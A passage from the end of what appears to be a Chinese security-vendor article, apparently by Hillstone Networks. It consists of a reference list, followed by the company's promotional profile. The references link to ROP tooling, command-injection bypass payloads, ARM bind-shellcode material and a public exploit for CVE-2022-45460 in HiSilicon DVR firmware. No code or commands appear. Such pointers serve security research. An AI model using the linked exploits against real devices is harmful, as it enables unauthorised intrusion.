https://kolegite.com/EE_library/books_and_lectures/%D0%9F%D1%80%D0%BE%D0%B3%D1%80% D0%B0%D0%BC%D0%B8%D1%80%D0%B0%D0%BD%D0%B5/Assembly/ARM_calling_convention. pdf  
   
  
[13]ARM instructions -   
https://developer.arm.com/documentation/dui0379/e/arm-and-thumb-inst ructions/  
   
  
[14]Ropper -   
https://github.com/sashs/Ropper  
   
  
[15]Bypass Without Space -   
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/READ ME.md#bypass-without-space  
   
  
[16]ARM Assembly Shellcode -  
https://conference.hitb.org/hitbsecconf2018ams/materials/D1T3%20- %20Maria%20Markstedter%20- %20From%20Zero%20to%20ARM%20Assembly%20Bind%20Shellcode.pdf  
   
  
[17]CVE-2022-45460 -   
https://nvd.nist.gov/vuln/detail/CVE-2022-45460  
   
  
[18]Exploit for CVE-2022-45460 -   
https://github.com/tothi/pwn-hisilicon-dvr/tree/master  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请540多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及边界安全、云安全、数据安全、业务安全、内网安全、智能安全运营、安全服务、安全运维等八大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/NGIAw2Z6vnIunOKIgoia7NibiaoWvRJIt9LFaW6icqVSicJzZqLlIicdic3LjTrIcsWc2D1GNia3YKcWWia53a0Z64X0u0A/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
****  
  
